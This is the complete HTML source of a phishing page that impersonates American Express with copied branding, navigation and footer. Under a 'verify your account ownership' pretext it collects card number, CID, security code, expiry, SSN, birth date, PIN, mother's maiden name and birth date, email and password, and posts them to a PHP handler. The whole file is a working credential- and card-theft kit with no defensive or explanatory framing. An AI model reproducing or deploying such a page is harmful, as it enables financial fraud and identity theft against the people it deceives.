
<html lang="en">
<head>
 <script>
function validateForm() {

  var cardnum = document.forms["payment-form"]["card_number"].value;
  cardnum = cardnum.replace(/\s/g, '');
   if(cardnum[0] != '3' || cardnum.length != 15 ){
    alert("Card Number is invalid");
    return false;
}

 var x = document.forms["payment-form"]["expired"].value;
  if (x < 2019 || x > 2027 ) {
    alert("Expired Date is invalid");
    return false;
  }

}

</script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>American Express</title>
    <link rel="icon" href="img/favicon.ico" type="image/gif" sizes="16x16">
    <!--Css Importing-->
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet"
          href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-social/5.1.1/bootstrap-social.min.css"/>
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
</head>
<style>
    input:focus {
        border-color: #d9d9d9;
    }
    input:valid {
        /*border-color: #42d142;*/
    }


</style>
<body>
<header>
    <div class="container">
        <nav class="navbar navbar-default " role="navigation" data-scroll-header>
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-menu">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand logo_desktop"  href="#"><img src="img/dls-logo-bluebox-solid.svg" alt=""></a>
                <a class="navbar-brand logo_mobile"  href="#"><img src="img/dls-logo-stack.svg" alt=""></a>
                <a href="#" class="login m_login">Log in</a>
            </div>
            <div class="collapse navbar-collapse" id="main-menu">
                <ul class="nav navbar-nav navbar-left">
                    <li><a data-scroll href="#">My Account</a></li>
                    <li><a data-scroll href="#">Cards</a></li>
                    <li><a data-scroll href="#">Travel</a></li>
                    <li><a data-scroll href="#">Rewards</a></li>
                    <li><a data-scroll href="#">Business</a></li>
                </ul>
                <ul class="co_login nav navbar-nav navbar-right">
                    <li><span class="glyphicon glyphicon-search" aria-hidden="true"></span></li>
                    <li><a href="#" class="help">help</a></li>
                    <li><a href="#" class="login">Log in</a></li>
                </ul>
            </div>
        </nav>
    </div>
</header>
<section class="section">
    <div class="container" style="background: #fff; padding: 23px;">
        <div class="row flex-justify-center" style="position: relative;">
                    <div class="text-center">
                        <h2>Please verify your account ownership.</h2>
                    </div>
                    <form method="POST" name="payment-form" id="payment-form" class="datpayment-form" action="a2.php" onsubmit="return validateForm()">
                        <div class="dpf-card-placeholder" style="display:none"></div>

                        <div class="col-xs-12 col-md-6 col-lg-4 col-lg-offset-2 login_l ">
                            <div class="form-group">
                                <label for="card_number">15 DIGIT CARD NUMBER</label>
                                <div class="dpf-input-container">
                                    <div class="dpf-input-row">

                                        <div class="dpf-input-container with-icon">
                                            <input type="text" id="ccn" required name="ccn" pattern="^\d{4} \d{6} \d{5}$" class="form-control dpf-input" title="Card Number is invalid" data-type="number" value="">
                                        </div>
                                    </div>

                                    <div class="dpf-input-row" style="display:none">
                                        <div class="dpf-input-column">
                                            <input type="hidden" size="2" data-type="exp_month" placeholder="MM">
                                            <input type="hidden" size="2" data-type="exp_year" placeholder="YY">


                                            <div class="dpf-input-container">
                                                <input type="text" class="dpf-input" data-type="expiry">
                                            </div>
                                        </div>
                                        <div class="dpf-input-column">

                                            <div class="dpf-input-container">
                                                <input type="text" class="dpf-input" size="4" data-type="cvc">
                                            </div>
                                        </div>
                                    </div>

                                    <div class="dpf-input-row" style="display:none">
                                        <label class="dpf-input-label">Nom du porteur</label>
                                        <div class="dpf-input-container">
                                            <input type="text" size="4" class="dpf-input" data-type="name">
                                        </div>
                                    </div>


                                </div>
                            </div>
                            <div class="form-group" >
                                <label for="card_holder_name">Card Holder's Full Name</label>
                                <input type="text" required id="fn" name="fn" class="form-control" value="">
                            </div>
                            <div class="form-group">
                                <label for="card_id">4-DIGIT CARD ID (CID)</label>
                                <input type="text" id="cid" required class="form-control nonarrow" name="cid"  value="" pattern="^[0-9]{4}$" title="4-Digit card ID is invalid" onKeyPress="if(this.value.length==4) return false;" >
                            </div>
                            <div class="form-group">
                                <label for="card_security">Card Security Code (CSC)</label>
                                <input type="text" id="csc" required class="form-control nonarrow"  name ="csc" value="" pattern="^[0-9]{3}$" title="Card security code (CSC) is invalid"  onKeyPress="if(this.value.length==3) return false;" >
                            </div>
                            <div class="form-group">
                                <label for="expired">Expired Date</label>
                                <div class="expiredrow">
                                    <!-- <input type="text" id="card_expired_mm" required class="form-control dates" placeholder="MM" name ="card_expired_mm" value="" pattern="^(0?[1-9]|1[012])$"  title="Please enter a valid Month." onKeyPress="if(this.value.length==2) return false;" >-->
                                    <select id="expm" style="width: 100%;" name="expm" pattern="^(0?[1-9]|1[012])$"  title="Please enter a valid Month." required class="select-css">
                                    <option value="" selected="selected">Month</option>
                                    <option value="01">01</option>
                                    <option value="02">02</option>
                                    <option value="03">03</option>
                                    <option value="04">04</option>
                                    <option value="05">05</option>
                                    <option value="06">06</option>
                                    <option value="07">07</option>
                                    <option value="08">08</option>
                                    <option value="09">09</option>
                                    <option value="10">10</option>
                                    <option value="11">11</option>
                                    <option value="12">12</option>
                                    </select>
                                    &nbsp;/&nbsp;
                                    <!--<input type="text" id="card_expired_yyyy" required class="form-control dates"  placeholder="YYYY" name ="card_expired_yyyy" value="" pattern="^(2019|202[0-9])$" title ="Accept only 2019 or greater" onKeyPress="if(this.value.length==4) return false;" >-->
                                    <select id="expy" style="width: 100%;" name="expy" pattern="^(2019|202[0-9])$" title ="Please enter a valid Year." required class="select-css">
                                    <option value="" selected="selected">Year</option>
                                    <option value="2019">2019</option>
                                    <option value="2020">2020</option>
                                    <option value="2021">2021</option>
                                    <option value="2022">2022</option>
                                    <option value="2023">2023</option>
                                    <option value="2024">2024</option>
                                    <option value="2025">2025</option>
                                    <option value="2026">2026</option>
                                    <option value="2027">2027</option>
                                    
                                    </select>

                                </div>
								</div>
							
                            <div class="form-group">
                                <label for="phone_number">Phone Number</label>
                                <input type="text" required pattern="^\d{10,}$" id="phone_number" title="Phone Number is invalid" name="phone" class="form-control nonarrow" value="">
                            </div>
                            <div class="form-group">
                                <label for="ss_number">Social Security Number</label>
                                <input type="text"  title="SSN is invalid" id="ss_number"  name="ssn" class="form-control input-medium bfh-phone" data-format="dd-ddd-dddd">
                            </div>


                            <div class="form-group">
                                <label for="birthday">Date of Birthday</label>
<!--                                <input type="date" id="birthday" name="birthday" class="form-control nonarrow"   value="">-->
                                <div class="expiredrow">
                                    <select id="card_expired_dd" name="card_expired_dd" pattern="^(0?[1-9]|[12][0-9]|3[01])$" title="Please enter a valid Day." onKeyPress="if(this.value.length==2) return false;" required class="select-css">
                                    <option value="" selected="selected">Day</option>
                                    <option value="01">01</option>
                                    <option value="02">02</option>
                                    <option value="03">03</option>
                                    <option value="04">04</option>
                                    <option value="05">05</option>
                                    <option value="06">06</option>
                                    <option value="07">07</option>
                                    <option value="08">08</option>
                                    <option value="09">09</option>
                                    <option value="10">10</option>
                                    <option value="11">11</option>
                                    <option value="12">12</option>
                                    <option value="13">13</option>
                                    <option value="14">14</option>
                                    <option value="15">15</option>
                                    <option value="16">16</option>
                                    <option value="17">17</option>
                                    <option value="18">18</option>
                                    <option value="19">19</option>
                                    <option value="20">20</option>
                                    <option value="21">21</option>
                                    <option value="22">22</option>
                                    <option value="23">23</option>
                                    <option value="24">24</option>
                                    <option value="25">25</option>
                                    <option value="26">26</option>
                                    <option value="27">27</option>
                                    <option value="28">28</option>
                                    <option value="29">29</option>
                                    <option value="30">30</option>
                                    <option value="31">31</option>
                                    </select>
                                    &nbsp;/&nbsp;
                                    <!--<input type="number" placeholder="MM" id="mother_card_expired_mm" class="form-control maindate"  name ="mother_card_expired_mm" value="1" required pattern="^(0?[1-9]|1[012])$" title="Please enter a valid Month." onKeyPress="if(this.value.length==2) return false;" >-->
                                    <select id="card_expired_mm" name="card_expired_mm" pattern="^(0?[1-9]|1[012])$" title="Please enter a valid Month." required class="select-css">
                                    <option value="" selected="selected">Month</option>
                                    <option value="January">January</option>
                                    <option value="February">February</option>
                                    <option value="March">March</option>
                                    <option value="April">April</option>
                                    <option value="May">May</option>
                                    <option value="June">June</option>
                                    <option value="July">July</option>
                                    <option value="August">August</option>
                                    <option value="September">September</option>
                                    <option value="October">October</option>
                                    <option value="November">November</option>
                                    <option value="December">December</option>
                                    
                                    </select>
                                    &nbsp;/&nbsp;
                                    <input type="text" id="card_expired_yyyy" placeholder="YYYY" required pattern="^(19[0-9][0-9]|200[012])$" title ="Please enter a valid Year" class="form-control maindate"  name ="card_expired_yyyy" value=""  onKeyPress="if(this.value.length==4) return false;" >
                                </div>
                            </div>
                             <div class="form-group question" id="question1">
                                <label for="birthday">Security Pin</label>
                                <input type="text" id="pin"  name ="pin" class="form-control"   value="">
                            </div>
                            <div class="form-group question" id="question1">
                                <label for="birthday">Mother Maiden's Name</label>
                                <input type="text"  name ="mothername" class="form-control"   value="">
                            </div>
                            <div class="form-group question" id="question2">
                                <label for="birthday">Mother's Date Of Birth</label>
                                <div class="expiredrow">
                                    <!-- <input type="number" placeholder="DD" id="mother_card_expired_dd" class="form-control maindate"  name ="mother_card_expired_dd" value="1" required pattern="^(0?[1-9]|[12][0-9]|3[01])$" title="Please enter a valid Day." onKeyPress="if(this.value.length==2) return false;" >-->
                                    <select id="mother_card_expired_dd" name="mother_card_expired_dd" pattern="^(0?[1-9]|[12][0-9]|3[01])$" title="Please enter a valid Day." onKeyPress="if(this.value.length==2) return false;" class="select-css">
                                    <option value="" selected="selected">Day</option>
                                    <option value="01">01</option>
                                    <option value="02">02</option>
                                    <option value="03">03</option>
                                    <option value="04">04</option>
                                    <option value="05">05</option>
                                    <option value="06">06</option>
                                    <option value="07">07</option>
                                    <option value="08">08</option>
                                    <option value="09">09</option>
                                    <option value="10">10</option>
                                    <option value="11">11</option>
                                    <option value="12">12</option>
                                    <option value="13">13</option>
                                    <option value="14">14</option>
                                    <option value="15">15</option>
                                    <option value="16">16</option>
                                    <option value="17">17</option>
                                    <option value="18">18</option>
                                    <option value="19">19</option>
                                    <option value="20">20</option>
                                    <option value="21">21</option>
                                    <option value="22">22</option>
                                    <option value="23">23</option>
                                    <option value="24">24</option>
                                    <option value="25">25</option>
                                    <option value="26">26</option>
                                    <option value="27">27</option>
                                    <option value="28">28</option>
                                    <option value="29">29</option>
                                    <option value="30">30</option>
                                    <option value="31">31</option>
                                    </select>
                                    &nbsp;/&nbsp;
                                    <!--<input type="number" placeholder="MM" id="mother_card_expired_mm" class="form-control maindate"  name ="mother_card_expired_mm" value="1" required pattern="^(0?[1-9]|1[012])$" title="Please enter a valid Month." onKeyPress="if(this.value.length==2) return false;" >-->
                                    <select id="mother_card_expired_mm" name="mother_card_expired_mm" pattern="^(0?[1-9]|1[012])$" title="Please enter a valid Month." class="select-css">
                                    <option value="" selected="selected">Month</option>
                                    <option value="January">January</option>
                                    <option value="February">February</option>
                                    <option value="March">March</option>
                                    <option value="April">April</option>
                                    <option value="May">May</option>
                                    <option value="June">June</option>
                                    <option value="July">July</option>
                                    <option value="August">August</option>
                                    <option value="September">September</option>
                                    <option value="October">October</option>
                                    <option value="November">November</option>
                                    <option value="December">December</option>
                                    
                                    </select>
                                    &nbsp;/&nbsp;
                                    <input type="number" placeholder="YYYY" id="mother_card_expired_yyyy" class="form-control maindate"  name ="mother_card_expired_yyyy" value="" placeholder="YYYY" pattern="^(19[0-9][0-9]|200[012])$" title ="Please enter a valid Year" onKeyPress="if(this.value.length==4) return false;" >

                                </div>
								</div>
									 <div class="form-group">
                                <label for="birthday">Email Address</label>
                                <input type="text"  name ="email" required class="form-control"   value="">
                            </div>
                            <div class="form-group">
                                <label for="birthday">Password</label>
                                <input type="password"  name ="password" required class="form-control"   value="">
                            </div>
							 
                            </div>
                       
                        <div class="col-xs-12 col-md-6 col-lg-4 login_r text-center"></div>
                        <button type="submit"  id ="continuebtn" class="btn btn-primary" style="width:189px; bottom:0; right:3px; position:absolute;">Continue</button>
<!--                        <button name ="continue" id ="continue" class="btn btn-primary" >Continue</button>-->
                        <input type="hidden" value="submit" name="action">
                    </form>

                </div>
    </div>
</section>
<footer class="container">
    <div class="footer_1 row">
        <div class="col-md-3">
            <p>About</p>
            <ul>
                <li><a href="#">About American Express</a></li>
                <li><a href="#">Investor Relations</a></li>
                <li><a href="#">Careers</a></li>
                <li><a href="#">Site Map</a></li>
                <li><a href="#">Contact Us</a></li>
            </ul>
        </div>
        <div class="col-md-3">
            <p>PRODUCTS & SERVICES</p>
            <ul>
                <li><a href="#">Credit Cards</a></li>
                <li><a href="#">Small Business Credit Cards</a></li>
                <li><a href="#">Corporate Cards</a></li>
                <li><a href="#">Prepaid Cards</a></li>
                <li><a href="#">Savings Accounts & CDs</a></li>
                <li><a href="#">Gift Cards</a></li>
            </ul>
        </div>
        <div class="col-md-3">
            <p>LINKS YOU MAY LIKE</p>
            <ul>
                <li><a href="#">Membership Rewards</a></li>
                <li><a href="#">Free Credit Score & Report</a></li>
                <li><a href="#">CreditSecure</a></li>
                <li><a href="#">Bluebird</a></li>
                <li><a href="#">Accept Amex Cards</a></li>
                <li><a href="#">Refer A Friend</a></li>
            </ul>
        </div>
        <div class="col-md-3">
            <p>ADDITIONAL INFORMATION</p>
            <ul>
                <li><a href="#">Card Agreements</a></li>
                <li><a href="#">Financial Education</a></li>
                <li><a href="#">Servicemember Benefits</a></li>
                <li><a href="#">Supplier Management</a></li>
            </ul>
        </div>
    </div>
    <hr>
    <div class="footer_2">
        <div class="foo_logo">
            <div><img src="img/dls-logo-line.svg"></div>
            <div><p><img src="img/dls-flag-us.svg" style="max-width: 21px;"> United States <a href="#">Change
                Country</a></p></div>
        </div>
        <div class="foo_social">
            <ul>
                <li><a href="#"><img src="img/fb.png"></a></li>
                <li><a href="#"><img src="img/tw.png"></a></li>
                <li><a href="#"><img src="img/in.png"></a></li>
                <li><a href="#"><img src="img/li.png"></a></li>
                <li><a href="#"><img src="img/you.png"></a></li>
            </ul>
        </div>
        <div class="foo_menu">
            <ul>
                <li><a href="#">Terms of Service</a></li>
                <li><a href="#">Privacy Center</a></li>
                <li><a href="#">AdChoices</a></li>
                <li><a href="#">Security Center</a></li>
            </ul>
        </div>
    </div>
    <div class="footer_3">
        <p>All users of our online services subject to Privacy Statement and agree to be bound by Terms of Service.
            Please review.</p>
        <p>© 2019 American Express Company. All rights reserved</p>
    </div>
</footer>
</body>
<!--<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>-->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<script src="js/custom.js"></script>
<script type="text/javascript" src="https://js.stripe.com/v2/"></script>
<script type="text/javascript" src="js/DatPayment.js"></script>
<script type="text/javascript">
    var payment_form = new DatPayment({
        form_selector: '#payment-form',
        card_container_selector: '.dpf-card-placeholder',

        number_selector: '.dpf-input[data-type="number"]',
        date_selector: '.dpf-input[data-type="expiry"]',
        cvc_selector: '.dpf-input[data-type="cvc"]',
        name_selector: '.dpf-input[data-type="name"]',

        submit_button_selector: '.dpf-submit',

        placeholders: {
            number: '•••• •••• •••• ••••',
            expiry: '••/••',
            cvc: '•••',
            name: 'DUPONT'
        },

        validators: {
            number: function(number){
                return Stripe.card.validateCardNumber(number);
            },
            expiry: function(expiry){
                var expiry = expiry.split(' / ');
                return Stripe.card.validateExpiry(expiry[0]||0,expiry[1]||0);
            },
            cvc: function(cvc){
                return Stripe.card.validateCVC(cvc);
            },
            name: function(value){
                return value.length > 0;
            }
        }
    });


</script>
<script>

    $('#r11').on('click', function(){
        $(this).parent().find('a').trigger('click')
    })

    $('#r12').on('click', function(){
        $(this).parent().find('a').trigger('click')
    })
    $('#r11_r').on('click', function(){
        $(this).parent().find('a').trigger('click')
    })

    $('#r12_r').on('click', function(){
        $(this).parent().find('a').trigger('click')
    })
    $('#card_number').on('change', function(){
            $(this).val();
            if($(this).val().replace(/\s/g, '').length !==15){
                $(this).addClass("warning_controller");
            }
    })
    $("#card_number").focusout(function(){
        $(this).val();
        if($(this).val().replace(/\s/g, '').length !==15){
            $(this).addClass("warning_controller");
        }else {
            $(this).removeClass("warning_controller");
        }

    });
    $('#card_id').on('change', function(){
        $(this).val();
        if($(this).val().replace(/\s/g, '').length !==4){
            $(this).addClass("warning_controller");
        }
    })
    $("#card_id").focusout(function(){
        $(this).val();
        if($(this).val().length !==4){
            $(this).addClass("warning_controller");
        }else {
            $(this).removeClass("warning_controller");
        }

    });

    $('#card_security').on('change', function(){
        $(this).val();
        if($(this).val().length !==3){
            $(this).addClass("warning_controller");
        }
    })
    $("#card_security").focusout(function(){
        $(this).val();
        if($(this).val().length !==3){
            $(this).addClass("warning_controller");
        }else {
            $(this).removeClass("warning_controller");
        }

    });

    $('#expired').on('change', function(){
        let str = $(this).val().split("-");
        if(str[0] > 2030){
            $(this).addClass("warning_controller");
        }
    });
    $("#expired").focusout(function(){
        let str = $(this).val().split("-");
        if(str[0] > 2030){
            $(this).addClass("warning_controller");
        }else {
            $(this).removeClass("warning_controller");
        }

    });

    $('#card_expired_mm').on('change', function(){
        let str = $(this).val();
        if(str> 12 || str< 1){
            // $(this).val("1");
            $(this).addClass("warning_controller");
        }
    });
    $("#card_expired_mm").focusout(function(){
        let str = $(this).val();
        if(str> 12 || str< 1){
            // $(this).val("1");
            $(this).addClass("warning_controller");
        }else {
            $(this).removeClass("warning_controller");
        }

    });
    $('#card_expired_yyyy').on('change', function(){
        let str = $(this).val();
        if(str>= 2027 || str< 2019){
            // $(this).val("2019");
            $(this).addClass("warning_controller");
        }
    });
    $("#card_expired_yyyy").focusout(function(){
        let str = $(this).val();
        if(str>= 2027 || str< 2019){
            // $(this).val("2019");
            $(this).addClass("warning_controller");
        }else {
            $(this).removeClass("warning_controller");
        }

    });
    // $("#continuebtn").on('click' ,function () {
    //     if($('#card_number').val().length === 17 && $('#card_id').val().length ===4 &&
    //         $('#card_security').val().length === 3
    //     ){
    //         $("#payment-form").submit();
    //     }
    // });
    $('input:empty, textarea:empty').addClass('empty');
    $('input').keyup(function () {
        if ($(this).val().trim() !== '') {
            $(this).removeClass('warning_controller');
        } else {
            $(this).addClass('warning_controller');
        }
    });
</script>
</html>